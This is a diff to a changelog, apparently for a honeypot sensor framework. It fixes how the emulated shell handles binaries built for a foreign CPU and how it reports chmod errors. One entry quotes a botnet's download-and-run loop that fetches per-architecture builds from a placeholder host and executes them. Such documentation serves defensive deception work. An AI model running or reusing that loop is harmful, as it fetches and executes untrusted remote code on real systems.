@@ -21,6 +21,21 @@
 
 ### Fixed
 
+- **Running a program built for another CPU now fails, so per-architecture loops go on** -
+  observed live 2026-10-08: a bot's `for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do wget
+  http://H/$a -O .c; chmod +x .c && ./.c && break; done` ended at `mips` because every fetched
+  file ran with status 0, so the x86_64 build, the only one that matters on the Ubuntu persona
+  (armv7 on the phone), was never asked for. A file is now judged by its ELF header when its bytes
+  are one, else by the architecture token in the URL or local name it was fetched with; that
+  origin follows `cp`, `mv` and `cat FILE > DEST`, so the Eclipse busybox-copy sequence is judged
+  by what was cat over the copy. A foreign build answers `bash: ./x: cannot execute binary file:
+  Exec format error` (dash: `sh: 1: ./x: Exec format error`, both status 126; the phone's mksh:
+  `not executable: 32-bit ELF file`), so `&& break` and `||` chains behave as on a real host. The
+  persona's own build, a name with no token and a file the session typed still run silently.
+  `chmod` on the Ubuntu persona also names a missing operand (`chmod: cannot access 'x': No such
+  file or directory`, status 1) as GNU chmod does, which the loop's `|| chmod +x $a && ./$a`
+  branch depends on (`crates/sensor-framework/src/shell/arch.rs`).
+
 - **The configuration check's `fix:` lines now run when pasted** - observed live 2026-10-08: the
   no-log finding's `grep LOG_PATH /etc/propolis/*.env` was refused (those files are root-only),
   and the no-events finding's line ran `psql "$DATABASE_URL" ...` (unset in an operator's shell)
